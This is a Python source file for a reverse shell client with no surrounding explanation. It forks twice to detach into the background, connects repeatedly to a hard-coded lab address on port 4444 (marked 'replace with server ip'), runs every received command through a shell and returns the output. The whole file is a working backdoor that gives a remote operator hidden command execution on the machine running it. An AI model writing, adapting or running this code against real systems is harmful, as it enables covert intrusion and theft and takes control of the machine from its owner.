import socket
import subprocess
import os
import sys
import time

def daemonize():
    #run client in the background by forking the process
    try:
        pid = os.fork()
        if pid > 0:
            #parent process exits
            sys.exit(0)
    except OSError as e:
        print(f"[!] Fork failed: {e}")
        sys.exit(1)

    #child process
    os.setsid()  #create new session
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        print(f"[!] second fork failed: {e}")
        sys.exit(1)

def connect_to_server():
    # connect to server and handle commands.
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(('192.168.232.133',4444)) # replace with server ip
            print(f"[*] connected to server")
            while True:
                # receive command from server
                command = client.recv(4096).decode('utf-8', errors='ignore')
                if not command:
                    break
                try:
                    #execute command from server
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                except Exception as e:
                    output = f"Error: {str(e)}"
                #send output back to server
                client.send(output.encode('utf-8'))
        except Exception as e:
            print(f"[!] connection error: {e}")
            time.sleep(5)#retry after 5 seconds
        finally:
            client.close()

if __name__ == "__main__":
    daemonize() #run in background
    connect_to_server()

